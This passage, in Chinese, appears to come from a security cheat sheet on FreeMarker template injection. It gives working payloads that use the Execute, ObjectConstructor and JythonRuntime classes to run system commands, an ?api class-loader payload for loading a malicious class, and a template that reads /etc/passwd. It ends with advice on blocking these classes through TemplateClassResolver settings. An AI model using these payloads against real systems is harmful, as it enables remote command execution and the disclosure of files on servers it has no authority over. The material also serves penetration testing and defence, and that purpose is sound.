payload

#### 应用场景

* freemarker与Thymeleaf和Velocity不同，无法直接传参攻击。攻击点主要在上传模板、修改模板等功能处。
* 下面介绍的两种内建函数可以达到命令执行的效果，但api函数必须在配置项api_builtin_enabled为true时才有效，该配置在2.3.22版本后默认为false

#### new内建函数利用

* 调用Runtime.getRuntime().exec进行命令执行

```html
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```

* 实例化可执行对象进行命令执行

```java
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```

* 利用freemarker.template.utility.JythonRuntime来执行Jython脚本

```html
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```

这需要有相关的依赖，但是我添加相关依赖后仍然没有成功

```xml
<dependency>
            <groupId>org.python</groupId>
            <artifactId>jython</artifactId>
            <version>2.5.3</version>
</dependency>
```

#### api内建函数利用

* 加载恶意类

```html
<#assign classLoader=object?api.class.getClassLoader()>${classLoader.loadClass("Evil.class")}
```

* 任意文件读取

```html
<#assign uri=object?api.class.getResource("/").toURI()> <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()> <#assign is=input?api.getInputStream()> FILE:[<#list 0..999999999 as _> <#assign byte=is.read()> <#if byte == -1> <#break> </#if> ${byte}, </#list>]
```

#### 漏洞防御和修复

从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析： 1、UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。 2、SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime 、 freemarker.template.utility.Execute 、 freemarker.template.utility.ObjectConstructor 这三个类。 3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。 可通过freemarker.core.Configurable#setNewBuiltinClassResolver 方法设置 TemplateClassResolver ，从而限制通过 new() 函数对freemarker.template.utility.JythonRuntime 、 freemarker.template.utility.Execute 、 freemarker.template.utility.ObjectConstructor 这三个类的解析。